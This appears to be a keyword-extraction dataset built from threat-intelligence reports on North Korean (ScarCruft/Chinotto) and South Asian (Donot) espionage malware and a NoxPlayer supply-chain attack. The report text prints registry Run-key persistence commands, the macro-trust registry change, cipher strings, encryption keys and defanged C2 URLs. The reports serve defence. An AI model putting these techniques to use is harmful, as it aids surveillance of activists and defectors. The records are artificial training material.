deeper investigation on a host compromised by ScarCruft. The victim was infected by PowerShell malware and we discovered evidence that the actor had already stolen data from the victim and had been surveilling this victim for several months. The actor also attempted to send spear-phishing emails to the victims’ associates working in businesses related to North Korea by using stolen login credentials.Based on the findings from the compromised machine, we discovered additional malware. The actor utilized three types of malware with similar functionalities: versions implemented in PowerShell, Windows executables and Android applications. Although intended for different platforms, they share a similar command and control scheme based on HTTP communication. Therefore, the malware operators can control the whole malware family through one set of command and control scripts.We were working closely with a local CERT to investigate the attacker’s command and control infrastructure and as a result of this, we were able better understand how it works. The APT operator controls the malware using a PHP script on the compromised web server and controls the implants based on the HTTP parameters. We were also able to acquire several log files from the compromised servers. Based on said files, we identified additional victims in South Korea and compromised web servers that have been utilized by ScarCruft since early 2021. Additionally, we discovered older variants of the malware, delivered via HWP documents, dating back to mid-2020.More information about ScarCruft is available to customers of Kaspersky Intelligence Reporting. Contact: intelreports@kaspersky.comSpear-phishing document Before spear-phishing a potential victim and sending a malicious document, the actor contacted an acquaintance of the victim using the victim’s stolen Facebook account. The actor already knew that the potential target ran a business related to North Korea and asked about its current status. After a conversation on social media, the actor sent a spear-phishing email to the potential victim using a stolen email account. The actor leveraged their attacks using stolen login credentials, such as Facebook and personal email accounts, and thereby showed a high level of sophistication.After a Facebook conversation, the potential target received a spear-phishing email from the actor. It contains a password-protected RAR security)Modified timeAuthorLast saved user2021-09-03 09:34:00Leopard CloudThis document contains a malicious macro and a payload for a multi-stage infection process. The first stage’s macro contains obfuscated strings and then spawns another macro as a second stage.The first stage macro checks for the presence of a Kaspersky security solution on the victim’s machine by trying the following file paths:C:\Windows\avp.exe # Kaspersky AV C:\Windows\Kavsvc.exe # Kaspersky AV C:\Windows\clisve.exe # UnknownIf a Kaspersky security solution is indeed installed on the system, it enables trust access for Visual Basic Application (VBA) by setting the following registry key to ‘1’:1 HKEY_CURRENT_USER\Software\Microsoft\Office\[Application.Version]\Word\Security\AccessVBOMBy doing so, Microsoft Office will trust all macros and run any code without showing a security warning or requiring the user’s permission. Next, the macro creates a mutex named ‘ sensiblemtv16n’ and opens the malicious file once more. Thanks to the “trust all macros” setting, the macro will be executed automatically.If no Kaspersky security software is installed, the macro directly proceeds to decrypt the next stage’s payload. In order to achieve this, it uses a variation of a substitution method. The script compares the given encrypted string with a second string to get an index of matched characters. Next, it receives a decrypted character with an index acquired from the first string.First string: BU+13r7JX9A)dwxvD5h2WpQOGfbmNKPcLelj(kogHs.#yi*IET6V&tC,uYz=Z0RS8aM4Fqn Second string: v&tC,uYz=Z0RS8aM4FqnD5h2WpQOGfbmNKPcLelj(kogHs.#yi*IET6V7JX9A)dwxBU+13rThe decrypted second stage Visual Basic Application (VBA) contains shellcode as a hex string. This script is responsible for injecting the shellcode into the process notepad.exe.2/12Shellcode in the second stage VBAThe shellcode contains the URL to fetch the next stage payload. After fetching the payload, the shellcode decrypts it with trivial single- byte XOR decryption. Unfortunately, we weren’t able to gather the final payload when we investigated this sample.The payload’s download path is:1 hxxps://api.onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBalVyZDlodU1wUWNjTGt4bXhBV0pjQU1ja2M_ZT1mUnc4Host investigation As a result of our efforts in helping the victim with the analysis, we had a chance to investigate the host of the owner who sent the spear- phishing email. When we first checked the process list, there was a suspicious PowerShell process running with a rather suspicious booted. The fetched ‘1.html’ is an HTML Application (.hta) file that contains Visual Basic Script (VBS), which eventually executes PowerShell commands. The PowerShell script offers simple backdoor functionalities and continuously queries the C2 server with HTTP POST requests containing several parameters. At first, it sends a beacon to the C2 server with the host name:1 hxxp://[redacted].cafe24[.]com/bbs/probook/do.php?type=hello&direction=send&id=[host name]Next, it attempts to download commands from the C2 server with the following format:1 hxxp://[redacted].cafe24[.]com/bbs/probook/do.php??type=command&direction=receive&id=If the HTTP response from the C2 server is 200, it checks the response data and executes the delivered commands.Delivered dataDescriptionref:cmd:Send a beacon to the C2 server: HTTP request: ?type=hello&direction=send&id=If the command data includes ‘start’, execute the given command with cmd.exe and send base64 encoded ‘OK’ with the following POST format. Otherwise, it executes the given command, redirecting the result to the result file (%APPDATA%\desktop.dat), and sends the contents of the file after base64 encoding. HTTP request: ?type=result&direction=send&id=3/12We discovered additional malware, tools and stolen files from the victim’s host. Due to limited access to the compromised host, we were unable to figure out the initial infection vector. However, we assess this host was compromised on March 22, 2021, based on the timestamp of the suspicious files. One characteristic of the malware we discovered from the victim is the writing of execution results from commands to the file “%appdata%\desktop.dat”. According to the Master File Table (MFT) information, this file was created the same day, March 22, 2021, and the last modification time is on September 8, 2021, which means this file was used until just before our investigation.Using the additional tools, the malware operator collected sensitive information from this victim, although we can’t assess exactly how much data was exfiltrated and what kind of data was stolen. Based on the timestamp of the folders and files created by the malware, the actor collected and exfiltrated files as early as August 2021. The log files with the .dat extension are encrypted, but can be decrypted with the one-byte XOR key 0x75. These log files contain the uploading history. We found two log files and each of them contains slightly different logs. The ‘B14yNKWdROad6DDeFxkxPZpsUmb.dat’ file contains zipping and uploading of the folder bearing the same name. The log file presents the process as: “Zip Dir Start > Up Init > Up Start > Up File Succeed > Zip Dir Succeed”. According to the log file, the malware operator collected something from the infected system in this folder and uploaded it after archiving.File archiving and uploading logThe other log file, named “s5gRAEs70xTHkAdUjl_DY1fD.dat”, also contains a file uploading history, except for file zipping messages. It processes each file with this procedure: “Up Init > Up Start > Up File Succeed”.File uploading logBased on what we found from this victim, we can confirm that the malware operator collected screenshots and exfiltrated them between August 6, 2021 and September 8, 2021. Based on what we found out from the victim, we can summarize the whole infection timeline. We suspect this host was compromised on March 22, 2021. After the initial infection, the actor attempted to implant additional malware, but an error occurred that led to the crash of the malware. The malware operator later delivered the Chinotto malware in August 2021 and probably started to exfiltrate sensitive data from the victim.Timeline of the attack on the victimWindows executable Chinotto4/12As a result of the host investigation, we discovered a malicious Windows executable and found additional malware variants from VirusTotal and our own sample collection. One of the Windows executables contains a build path and the malware author appears to call discovered from the host investigation. One of the characteristics of this malware is that it contains a lot of garbage code to impede analysis. During runtime, the malware copies unused data to the allocated buffer before copying the real value; or allocates an unused buffer, filling it with meaningless data, and never uses it.It also restores functional strings such as C2 addresses and debugging messages to the stack at runtime. The malware creates a mutex and fetches the C2 addresses, which are different for each sample we discovered:12Mutex: NxaNnkHnJiNAuDCcoCKRAngjHVUZG2hSZL03pw8YC2 address: hxxp://luminix.openhaja[.]com/bbs/data/proc1/proc.phpIn order to generate the identification value of the victim, the malware acquires both computer and user name and combines them in the format ‘%computer name%_%user name%’. Next, it encrypts the acquired string with the XOR key ‘YFXAWSAEAXee12D4’ and encodes it with base64.The backdoor continuously queries the C2 server, awaiting commands from the malware operator. We observed an early version of backdoor command ‘scap’. This means this specific sample is only designed for exfiltrating the victim’s screenshot.The Chinotto malware shows fully fledged capabilities to control and exfiltrate sensitive information from the victims.Command Descriptionref:cmd:down:up:state:Send beacon to the C2 server: url URL]?ref=id=%s&type=hello&direction=sendExecute Windows commands and save the result to the %APPDATA%\s5gRAEs70xTHkAdUjl_DY1f.dat file after encrypting wit one-byte XOR keyDownload file from the remote serverUpload fileUpload log file (s5gRAEs70xTHkAdUjl_DY1fD.dat)regstart:Copy current malware to the CSIDL_COMMON_DOCUMENTS folder and execute command to register file to run registry: “reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v a2McCq /t REG_SZ /d %s /f”cleartemp: Remove files from folder “%APPDATA%\s5gRAEs70xTHkAdUjl_DY1fD”updir:init:scap:run:chdec:update:Archive directory and upload it. Archive is XOR encoded using the same key used when creating the identification value: ‘YFXAWSAEAXee12D4’Collect files with following extensions from the paths CSIDL_DESKTOP, CSIDL_PERSONAL(CSIDL_MYDOCUMENTS), CSIDL_MYMUSIC, CSIDL_MYVIDEO. Downloads and upload them to C2 server: jpg|jpeg|png|gif|bmp|hwp|doc|docx|xls|xlsx|xlsm|ppt|pptx|pdf|txt|mp3|amr|m4a|ogg|aac|wav|wma|3gpp|eml|lnk|zip|rar|egg|alz|7zTake a screenshot, save it to the folder “%appdata%\s5gRAEs70xTHkAdUjl_DY1fD” in an archived format. The file to store the screenshot has an ‘e_‘ prefix and 10 randomly generated characters as a filename. When uploading the screenshot file, it uses ‘wrpdwRwsFEse’ as the filenameRun Windows commands with ShellExecuteW APIDownload an encrypted file and decrypt it via CryptUnprotectData APIDownload updated malware and register it: reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v m4cVWKDsa9WxAWr41iaNGR /t RE discovered from the same victim. This is the same fully featured backdoor, but it loads the backdoor command using a different scheme. The malware checks for the existence of a ‘*.zbpiz’ file in the same folder. If it exists, it loads the file’s content and uses it as a backdoor command after decrypting. The malware authors keep changing the capabilities of the malware to evade detection and create custom variants depending on the victim’s scenario.In addition, there are different Windows executable variants of the Chinotto malware. Apart from the conventional Chinotto malware mentioned above, a different variant contains an embedded PowerShell script. The spawned PowerShell command has similar functionality to the PowerShell we found from the victim. However, it contains additional backdoor commands, such as uploading and downloading capabilities. Based on the build timestamp of the malware, we assess that the malware author used the PowerShell embedded version from mid-2019 to mid-2020 and started to use the malicious, PowerShell-less Windows executable from the end of 2020 onward.Android Chinotto Based on the C2 communication pattern, we discovered an Android application version of Chinotto malware (MD5 achieve its purpose of spying on the user, these apps ask users to enable various sorts of permissions. Granting these permissions allows the apps to collect sensitive information, including contacts, messages, call logs, device information and audio recordings. Each sample has a different package name, with the analyzed sample bearing “com.secure.protect” as a package name.The malware sends its unique device ID in the same format as the Windows executable version of Chinotto.1 Beacon URI pattern: [C2 url]?type=hello&direction=send&id=[Unique Device ID]Next, it receives a command after the following HTTP request:1 Retrieve commands: [C2 url]?type=command&direction=receive&id=[Unique Device ID]If the delivered data from the C2 server is not “ERROR” or “Fail”, the malware starts to carry out backdoor operations.Command URI patternDescriptionref:downUriP? type=hello&direction=send&id=Send the same beacon request to the C2 server?type=file&direction=send&id= Upload the temporary file (/sdcard/.temp-file.dat) to the C2 server and remove it fromlocal storage.?type=file&direction=send&id=Save temporary file path to the result file (/sdcard/result-file.dat) and upload the temporary file.UploadInfo ?type=hello&direction=send&id= ?type=file&direction=send&id=After sending a beacon, collect the following information to the /icloud/tmp-web path:Info.txt: Phone number, IP address, SDK version (OS version), Temporary file path Sms.txt: Save all text messages with JSON format Calllog.txt: Save all call logs with JSON format Contact.txt: Save all contact lists with JSON format Account.txt: Save all account information with JSON formatUpload collected file after archiving. The archived file is encrypted by AES with the key “3399CEFC3326EEFF”.UploadFile?type=file&direction=send&id=Execute command ‘cd /sdcard;ls -alR’, save the result to the temporary file (/sdcard/.temp-file.dat) and upload it. Upload all thumbnails and photos after encrypting via AES and the key “3399CEFC3326EEFF”.ETC?type=file&direction=send&id=Execute command saving the result to the result file (/sdcard/result-file.dat) and upload the result ‘UploadFile’ command of this variant uploads specific files to the C2 server. The AMR file is an audio file generally used for recording phone calls. Also, Huawei cloud and Tencent services are two of the targets. To surveil the victim, the list includes target folders as well as /Camera, /Recordings, /KakaoTalk (a renowned Korean messenger), /문건(documents), /사진(pictures) and /좋은글(good articles).6/12Targeted files and foldersTo sum up, the actor targeted victims with a probable spear-phishing attack for Windows systems and smishing for Android systems. The actor leverages Windows executable versions and PowerShell versions to control Windows systems. We may presume that if a victim’s host and mobile are infected at the same time, the malware operator is able to overcome two-factor authentication by stealing SMS messages from the mobile phone. After a backdoor operation with a fully featured backdoor, the operator is able to steal any information they are interested in. Using the stolen information, the actor further leverages their attacks. For example, the group attempts to infect additional valuable hosts and contact potential victims using stolen social media accounts or email accounts.Attack procedureOlder malicious HWP documents The threat actor behind this campaign delivered the same malware with a malicious HWP file. At that time, lures related to COVID-19 and Chinotto malware. It also uses the same HTTP communication pattern. The second payload dropped from the malicious HWP is a Windows executable executing an embedded PowerShell script with the same functionalities. These discoveries reveal related activity dating back to at least mid-2020.Infrastructure In this campaign, the actor relied solely on compromised web servers, mostly located in South Korea. During this research we worked closely with the local CERT to take down the attacker’s infrastructure and had a chance to look into one of the scripts on the C2 servers that control the Chinotto malware. The C2 script (named “do.php”) uses several predefined files to save the client’s status (shakest) and carries four values: hello, command, result, and file.Value of ‘type’ param DescriptionhellocommandresultfileReport and control the client statusHold the command from the operator or retrieve the command from the clientUpload the command execution result or retrieve the commandUpload file to the C2 server‘hello’ type When the script receives the ‘type=hello’ parameter, it checks the value of ‘direction’. In this routine, the script checks the status of the client. The malware operator saves the client status to a specific file, the ‘shakest’ file in this case. If the ‘send’ value is being received, the client status is set to ‘ON’. If ‘receive’ is set as well, the client’s status log file is sent (likely in order to send the status of clients to the malware operator). The ‘refresh’ value is for setting all clients to ‘OFF’ and ‘release’ is used to initialize the command file. The client just replies ‘OK’.8/12‘type=hello’ commands‘command’ type In order to manage the implant’s commands, the C2 script handles several additional parameters. If the ‘type=command’ alongside ‘direction=receive’ is set, it issues a request from the client to retrieve a command.There are two kinds of command files: common commands like an initial command or commands sent to all clients, and individual commands for a specific client. If an individual command exists for a client, it delivers it. Otherwise, the client is sent a common command. If the ‘direction’ parameter is set to ‘send’, the request is coming from the malware operator in order to save the sent command in the C2 server. Using this request, the operator can set two commands files: common command or individual command. If the ‘botid’ parameter contains ‘cli’, it means this request is for setting a common command file. If the ‘data’ parameter contains ‘refclear:’, the common command file gets initialized. Otherwise, the ‘data’ value is saved to the common command file. If ‘botid’ is not ‘cli’, it means this request is directed to an individual command file. The process of saving the individual command file is the same as the process used for saving the common command.type=command commands9/12‘result’ type When uploading command execution results coming from the implant, the script sets the ‘type’ parameter to ‘result’. If the ‘direction’ parameter equals ‘send’, it saves the value of the ‘data’ parameter to the individual result file: “[botid]-result“. The ‘receive’ value of the ‘direction’ parameter means retrieving the individual result file. The script then sends the result file to the operator after encoding it with base64.‘file’ type The last possible ‘type’ command is ‘file’. This value is used for exfiltrating files from the victim. If a file upload succeeds, the script sends the message ‘SEND SUCCESS’. Otherwise, it sends ‘There was an error uploading the file, please try again!’.We discovered that the malware operator used a separate webpage to monitor and control the victims. From several compromised C2 servers we see a control page carrying a ‘control.php’ file name.Control page from this caseThe control page shows a simple structure. The operator can see a list of infected hosts in the left panel with the corresponding status “ON” or “OFF”. Based on this information, the operator is able to issue a command using the right panel and watch the result from the client.Victims We began this research by providing support to human rights activists and defectors from North Korea against an actor seeking to surveil and track them.Additionally, we discovered further victims we couldn’t profile from analyzing the C2 servers. From analyzing the attacker’s infrastructure, we found 75 client connections between January 2021 and February 2021. Most IP addresses seem to be Tor or VPN connections, which are likely to be either from researchers or the malware operators.Analyzing other C2 servers, we found more information about possible additional victims. Excluding connections coming from Tor, there are only connections coming from South Korea. Based on the IP addresses, we could distinguish four different suspected victims located in South Korea, and determine their operating system and browser used based on user-agent information:Victim A connected to the C2 server from July 16 to September 5 and has outdated versions of Windows OS and Internet Explorer. Victim B connected to this server on September 4 and operates Windows 8 and Internet Explorer 10. While we were investigating the C2 server, Victim D kept connecting to it, using Windows 10 with Chrome version 78.Timeline of victimsTo sum up, this campaign is targeting entities in South Korea, which is a top point of interest for ScarCruft. Based on our findings, we also assume that the threat actor targeted individuals rather than specific companies or organizations.Attribution10/12We discovered several code overlaps with old ScarCruft malware named POORWEB. At first, when Chinotto malware uploads the file to the C2 server, it uses the HTTP POST request with a boundary generated with a random function. When Chinotto malware (MD5 The generation process is not exactly the same, but it utilizes a similar scheme as the old POORWEB malware (MD5 previously utilized with POORWEB malware. When the Chinotto malware checks the response from the C2 server, it checks whether the response is ‘HTTP/1.1 200 OK’ and not ‘error’. This Document Stealer malware also has the same routine to check responses from the C2 server.C2 response check routineApart from code similarity, historically, ScarCruft group is known to surveil individuals related to North Korea such as journalists, defectors, diplomats and government employees. The target of this attack is within the same scope as previous ScarCruft group campaigns. Based on the victimology and several code overlaps, we assess with medium confidence that this cyber-espionage operation is related to the ScarCruft group.Conclusions Many journalists, defectors and human rights activists are targets of sophisticated cyberattacks. Unlike corporations, these targets typically don’t have sufficient tools to protect against and respond to highly skilled surveillance attacks. One of the purposes of our team is to help individuals targeted by APT groups. This research stemmed from this kind of endeavor. Our collaboration with the local CERT allowed us to gain a unique look into ScarCruft’s infrastructure setup and allowed us to discover many technical details.Using these findings, we found additional Android variants of the same malware, which has been invaluable in understanding and tracking ScarCruft TTPs. Moreover, while hunting for related activity, we uncovered an older set of activity dating back to mid-2020, possibly indicating that ScarCruft operations against this set of individuals have been operating for a longer period of time.Indicators of compromise hxxp://www[.]djsm.co[.]kr/js/20170805[.]hwpCommand and control serverhxxp://luminix[.]openhaja[.]com/bbs/data/proc1/proc[.]php hxxp://luminix[.]kr/bbs/data/proc/proc[.]php hxxp://kjdnc[.]gp114[.]net/data/log/do[.]php hxxp://kumdo[.]org/admin/cont/do[.]php hxxp://haeundaejugong[.]com/editor/chinotto/do[.]php hxxp://haeundaejugong[.]com/data/jugong/do[.]php hxxp://doseoul[.]com/bbs/data/hnc/update[.]php hxxp://hz11[.]cn/jquery-ui-1[.]10[.]4/tests/unit/widget/doc/pu[.]phpMITRE ATT&CK mappingTacticTechnique Technique NameResource Development T1584.006 Compromise Infrastructure: Web ServicesInitial AccessExecutionPersistenceDefense EvasionDiscoveryCollectionT1566.001 Phishing: Spear-phishing AttachmentT1059.001 T1059.005Command and Scripting Interpreter: PowerShell Command and Scripting Interpreter: Visual BasicT1547.001 Boot or Logon Autostart Execution: Registry Run Keys/Startup FolderT1140 T1036.005Deobfuscate/Decode Files or Information Masquerading: Match Legitimate Name or LocationT1033 T1082System Owner/User Discovery System Information DiscoveryT1113 T1560.002Screen Capture Archive Collected Data: Archive via LibraryCommand and ControlT1071.001 T1573.001Application Layer Protocol: Web Protocols Encrypted Channel: Symmetric CryptographyExfiltrationT1041Exfiltration Over C2 Channel12/12 ","{'phrases': ['Actor', 'spear', 'Word', 'RAR', 'Archive', 'macro', 'checks', 'registry', 'key', 'decrypt', 'VBA', 'a payload', 'Shellcode', 'next stage payload', 'remote server', 'Init', 'PowerShell', 'persistence', 'contacts', 'C2 server', 'commands', 'exfiltration', 'screenshots', 'credentials', 'associates', 'addition', 'Windows', 'Android', 'Malware', 'documents', 'messages', 'sensitive data', 'victims', '10', 'control', '11', 'time', 'detection'], 'target': 'Actor; spear; Word; RAR; Archive; macro; checks; registry; key; decrypt; VBA; a payload; Shellcode; next stage payload; remote server; Init; PowerShell; persistence; contacts; C2 server; commands; exfiltration; screenshots; credentials; associates; addition; Windows; Android; Malware; documents; messages; sensitive data; victims; 10; control; 11; time; detection.'}"
the attacker; a phishing email; Excel; malicious macro; Office_update.exe; macro code; Run; The decoy Excel document; PowerPoint; lt; BAT file; persistence; wlidsvcc.exe; svchots.exe; keylogger; keystrokes; the log file; the attackers.,"['1. The attacker sends a phishing email with a malicious Excel document to the victim. 2. The Excel document contains macros that execute when opened. 3. The macros drop and execute a downloader called office_update.exe. 4. office_update.exe fetches additional scripts and executables from a command and control server. 5. A plugin downloader called wlidsvcc.exe is installed and retrieves plugins for keylogging, file listing, system info collection, and data exfiltration. 6. wlidsvcc.exe communicates with the C2 server to receive commands and execute plugins. 7. The keylogger plugin logs keystrokes and window names. 8. The file listing plugin searches disks and collects filenames. 9. The system info plugin gathers details on the infected system. 10. The data exfiltration plugins upload collected data and files to the C2 server. 11. Persistence mechanisms like registry modifications and startup scripts are created. ']","Extract the keywords: 4/12/2019360360ti.360.net/blog/articles/donot-group-is-targeting-pakistani-businessman-working-in-china-enBackground Recently, 360 Threat Intelligence Center is investigating one email phishing attack which is targeting one Pakistani businessman who is working in China. First attack of this campaign took place in May 2018. Attackers have taken over of target machines over months. TTP of this targeting attack will be introduced, as well as remediation advice.We identiﬁed this APT group coded as ‘APT-C-35’ in 2017, who is mainly targeting Pakistan and other South Asian countries for cyber espionage[1]. Arbor also published APT research on this group, and named it ‘Donot’[2]. The group attacked government agencies, aiming for classiﬁed intelligence. At least 4 attack campaigns against Pakistan have been observed by us since 2017. Spear phishing emails with vulnerable Ofﬁce documents or malicious macros are sent to victims. Two unique malware frameworks, EHDevel and yty, are developed by attackers. In the latest attack, Donot group is targeting Pakistani businessman working in China. Fishing Attack The process of attacking target is as following:Malware Analysisurl Dropper - Excel Macros Attackers lure victim to open decoy Excel ﬁle with malicious macro which is sent as attachment in a phishing email. While macro code is running, ofﬁce_update.exe is dropped at C:\micro and run. The decoy Excel document pretends to be pricing list of one BMW car, which is easy to have trust of the victim:360Downloader - ofﬁce_update. exeﬁlename MD5ofﬁce_update.exe url BAT ﬁle is mainly to modify registry for persistence, and create a directory with hidden property, etc. It can also download wlidsvcc.exe from url then save it in %USERPROFILE%\BackConﬁg\BackUp directory:After that, Ofﬁce_updata.exe will remove itself from system.Plugin - Downloader - wlidsvcc.exeFilename wlidsvcc.exe and svchots.exe. Mutex ""wlidsvcc"" is created to ensure that only one instance runs in system:Then, it determines if the current process path is %USERPROFILE%BackConﬁg\BackUp\wlidsvcc.exe:If the path meets condition, wlidsvcc.exe communicates with C2 (bigdata.akamaihub.stream) by POST, which is to retrieve remote commandsIf C2 sends ‘no’ command, wlidsvcc.exe will retry to contact C2 after sleeping for 90 seconds:If ‘cmdline’ command is received, wlidsvcc.exe runs plug-in %USERPROFILE%\BackConﬁg\BackUp\wuaupdt.exe, and then listens for follow-up commands:urlIf commands are neither ‘no’ nor ‘cmdline’, wlidsvcc.exe downloads url to C:\Users\%s\BackConﬁg\BigData, then puts itself into waiting mode:Plugin executor - wuaupdt.exeFilename Wuaupdt.exe execute other plugins if commands are issued by attackers. The analysis of all backdoor plugins is shown in the following section.Execute C2 commands:Backdoor - Plugins wuaupdt.exe will execute corresponding plug-ins according to the commands issued by attackers. All plugins’ details are as following. Keylogger - Kylgr.exeFilename MD5 PDB pathKylgr.exe c:\users\user\documents\visualstudio2010\Projects\newkeylogger\Release\new keylogger.pdburlThis plugin is a keylogger. It ﬁrstly creates a ﬁle inc3++.txt in current directory and check whether a keylogging ﬁle exists in %USERPROFILE%\Printers\Neighbourhood directory. If yes, it saves log ﬁle name and its last modiﬁcation time to inc3++.txt:If keylogging ﬁle is found in %USERPROFILE%\Printers\Neighbourhood, the log ﬁle is moved to directory %USERPROFILE%\Printers\Neighbourhood\Spools:A new keylogging ﬁle is created in %USERPROFILE%\Printers\Neighbourhood, with ﬁlename ‘username_year_month_day(hour_minute_second)’. Then, it monitors activities of mouse and keyboard constantly.urlIf window name is obtained, the name and pressed keys are logged:File - listing - svchots.exeFilename MD5svchots.exe test.txt ﬁle in the current directory, and they are copied to %USERPROFILE%\Printers\Spools directory, with appending ‘txt’ as new extension name:Systeminfo – spsvc.exeFilename Spsvc.exe creates several CMD processes for information collection. Information is saved to a ﬁle located in directory %USERPROFILE%\Printers\Spools:urlUploader – lssm.exeFilename Md5Lssm.exe %USERPROFILE%Printers\Spools directory, to C2 bigdata.akamaihub.streamurlUploader – lssmp.exeFilename MD5 Digital signature COMODO CA Limitedlssmp.exe Some other decoy documents and plugins are found to have connections with the ﬁles in this attack. CSD_Promotion_Scheme_2018. XLSFilename CSD_Promotion_Scheme_2018. XLS MD5 disclamation pop up, warning user that this ﬁle has risky macros:urlThe main function of malicious macro code is to drop skypet.exe in the directory %APPDATA%, and to drop skype.bat in the directory C:\Skype. skypet.bat is executed after that:Same pricing list of a BMW car is content of the Excel ﬁle:urlSkyep.bat Skyep.bat creates 3 directories %USERPROFILE%Printers\Spools, %USERPROFILE%BackConﬁg\BackUp and %USERPROFILE%BackConﬁg\BigData , and then sets these folder properties to hidden:The BAT ﬁle also gets the computer name, and save it into %USERPROFILE%\BackConﬁg\Backup\pcap.txt:And it creates multiple registry entries for persistence. Then, it starts skyep.exe and deletes itself:Skyep.exeFile‐ C:\Users\spartan\Documents\Visual Studio 2010\Projects\downloader new 22 jun use\downloader\Release\downloader.pdbSkyep.exe, disguising as a voice software Skype, downloads csrsses.exe from url (it is still alive) to the \BackConﬁg\BackUp\ for running:urlCsrsses.exeThe ﬁle name Csrsses.exe. from \\BackConﬁg\\BackUp\\pcap.txtThe computer name is then processed to a string: ""orderme/computer name - random number"". It contacts C2 databig.akamaihub.stream for commands:urlIt check value of Content-Type to determine next operation. If the value is ""application"", it downloads ﬁle from C2 to \\BackConﬁg\\BigData\\ directory:If the value is ""cmdline"", \\BackConﬁg\\BigData\\wuaupdt.exe is executed:If command is""batcmd"", \\BackConﬁg\\BigData\\test.bat is started:Attribution -- Donot (APT-C-35)urlBy analyzing the macro code, plugins, domain name /IP correlation in the attack, we conﬁrm that Donot APT Group (APT-C-35) is behind the attack. Similarity of Macro Code ASERT disclosed one macro sample linking to DONOT APT Group in March 2018[2]. That macro sample is very similar to the sample in this attack: a decoy picture is pop up after macro runs.Similarity of Plug-ins Similar to previous Donot samples, new sample downloads plugins from C2. It is also packed by UPX and is written in Go language. Furthermore, it has similar code logic as previous oneswuaupdt.exe in this attack appears in previous Donot attack[1], and C2 addresses are same to previous ones. ConclusionurlFrom the attack activity captured this time, it is obvious that Donot APT group is still keen on Pakistan as primary target of attack, and even expands scope of attack to include Pakistani staffs and institutions in China. There is a sign that the Donot group has never stopped its attacks and another cyber espionage attack could be launched soon.360 Threat Intelligence Center suggests enterprises to improve employees' security awareness by provide them sufﬁcient security training, especially anti-phishing training. Situational awareness, asset management, and threat intelligence can prevent such attacks signiﬁcantly. For 360 ESG customers, detection to Donot group and related IOCs are supported by products integrated with threat intelligence, including 360 Threat Intelligence Platform, SkyEye Advance Threat Detection System, 360 NGSOC. databig.akamaihub.stream bigdata.akamaihub.stream unique.fontsupdate.com PDB path C:\Users\spartan\Documents\Visual Studio 2010\Projects\downloader new 22 jun use\downloader\Release\downloader.pdb C:\users\user\documents\visualstudio2010\Projects\newkeylogger\Release\new keylogger.pdbReference1. url2. url ","{'phrases': ['the attack', 'a phishing email', 'Excel', 'the victim', 'macros', 'wlidsvcc.exe', 'plugins', 'keylogging', 'system', 'data', 'C2', 'commands', 'details', '10', 'upload', 'persistence', 'registry'], 'target': 'the attack; a phishing email; Excel; the victim; macros; wlidsvcc.exe; plugins; keylogging; system; data; C2; commands; details; 10; upload; persistence; registry.'}"
the attacker; malware; NoxPlayer; users; Taiwan; Hong Kong; Sri Lanka; the victim; the malware; persistence; the system; data; the background; the intrusion; malware; access; escalation.,"[' 1. Compromise BigNox update infrastructure to replace legitimate updates with malware. 2. NoxPlayer client requests update info from BigNox API server. 3. API server responds with update URL pointing to malicious update. 4. NoxPlayer downloader retrieves and executes malicious update. 5. Malware executes, establishes persistence, and beacons to C2 server. 6. C2 server sends commands to perform surveillance activities. 7. Malware exfiltrates data over C2 channel. 8. Process repeated with new tailored malicious updates to selected victims. ']","Extract the keywords: Operation NightScout: Supply‑chain attack targets online gaming in AsiaESET researchers uncover a supply-chain attack used in a cyberespionage operation targeting online‑gaming communities in AsiaIgnacio Sanmillan1 Feb 2021 - 11:30AMDuring 2020, ESET research reported various supply-chain attacks, such as the case of WIZVERA VeraPort, used by government and banking websites in South Korea, Operation StealthyTrident compromising the Able Desktop chat software used by several Mongolian government agencies, and Operation SignSight, compromising the distribution of signing software distributed by the Vietnamese government.Share  In January 2021, we discovered a new supply-chain attack compromising the update mechanism of NoxPlayer, an Android emulator for PCs and Macs, and part of BigNox’s product range with over 150 million users worldwide.This software is generally used by gamers in order to play mobile games from their PCs, making this incident somewhat unusual.Three different malware families were spotted being distributed from tailored malicious updates to selected victims, with no sign of leveraging any financial gain, but rather surveillance-related capabilities.We spotted similarities in loaders we have been monitoring in the past with some of the ones used in this operation, such as instances we discovered in a Myanmar presidential office website supply-chain compromise on 2018, and in early 2020 in an intrusion into a Hong Kong university.About BigNoxBigNox is a company based in Hong Kong, which provides various products, primarily an Android emulator for PCs and Macs called NoxPlayer. The company’s official website claims that it has over 150 million users in more than 150 countries speaking 20 different languages. However, it’s important to note that the BigNox follower base is predominantly in Asian countries.BigNox also wrote an extensive blogpost in 2019 on the use of VPNs in conjunction with NoxPlayer, showing the company’s concern for their users’ privacy.We have contacted BigNox about the intrusion, and they denied being affected. We have also offered our support to help them past the disclosure in case they decide to conduct an internal investigation.Am I compromised?Who is affected: NoxPlayer users.How to determine if I received a malicious update or not: check if any ongoing process has an active network connection with known active C&C servers, or see if any of the malware based on the file names we provided in the report is installed in:C:\ProgramData\Sandboxie\SbieIni.dat C:\ProgramData\Sandboxie\SbieDll.dll C:\ProgramData\LoGiTech\LBTServ.dll C:\Program Files\Internet Explorer\ieproxysocket64.dll C:\Program Files\Internet Explorer\ieproxysocket.dll a file named %LOCALAPPDATA%\Nox\update\UpdatePackageSilence.exe not digitally signed by BigNox.How to stay safe:In case of intrusion – standard reinstall from clean media.For non-compromised users: do not download any updates until BigNox notifies that it has mitigated the threat.TimelineBased on ESET telemetry, we saw the first indicators of compromise in September 2020, and activity continued until we uncovered explicitly malicious activity on January 25 , 2021, at which point we reported the incident to BigNox.thVictimologyIn comparison to the overall number of active NoxPlayer users, there is a very small number of victims. According to ESET telemetry, more than 100,000 of our users have Noxplayer installed on their machines. Among them, only 5 users received a malicious update, showing that Operation NightScout is a highly targeted operation. The victims are based in Taiwan, Hong Kong and Sri Lanka.Figure 1. Asia victimology mapWe were unsuccessful finding correlations that would suggest any relationships among victims. However, based on the compromised software in question and the delivered malware exhibiting surveillance capabilities, we believe this may indicate the intent of collecting intelligence on targets somehow involved in the gaming community.It is important to highlight that, in contrast with similar previous operations such as the Winnti Group activity targeting the gaming industry in 2019, we haven’t found indicators that would suggest indiscriminate proliferation of malicious updates among a large number NoxPlayer users, reinforcing our belief that this is a highly targeted operation.Update mechanismIn order to understand the dynamics of this supply-chain attack, it’s important to know what vector was used in order to deliver malware to NoxPlayer users. This vector was NoxPlayer’s update mechanism.On launch, if 